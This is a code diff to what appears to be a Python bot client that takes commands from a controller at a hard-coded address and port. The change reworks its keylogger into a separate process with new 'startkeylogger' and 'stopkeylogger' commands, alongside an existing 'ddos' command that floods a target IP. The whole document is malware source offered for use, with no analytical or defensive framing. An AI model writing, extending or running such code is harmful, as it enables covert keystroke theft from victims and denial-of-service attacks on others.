@@ -1,3 +1,4 @@
+from signal import SIGTERM
 import socket
 import sys
 import selectors
@@ -25,6 +26,7 @@ def ddos(target_IP):
 HOST = "192.168.56.103"
 PORT = 1234
 ddosprocess = Process(target=ddos)
+keyloggerprocess = Process()
 
 while True:
 
@@ -59,9 +61,15 @@ while True:
                 print(s.recv(1024))
 
         # The keylogger cannot be stopped except by stopping the whole program!!
-        elif task[0] == 'keylogger':
+        elif task[0] == 'startkeylogger':
+            if(keyloggerprocess.is_alive()):
+                os.kill(keyloggerprocess.pid, SIGTERM)
             keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-            keylogger.start()
+            keyloggerprocess = Process(target = keylogger.start)
+            keyloggerprocess.start()
+        elif task[0] == "stopkeylogger":
+            if(keyloggerprocess.is_alive()):
+                os.kill(keyloggerprocess.pid, SIGTERM)
         elif task[0] == 'ddos':
             print("DDOS " + task[1])
             ddosprocess = Process(target=ddos, args=(task[1],))
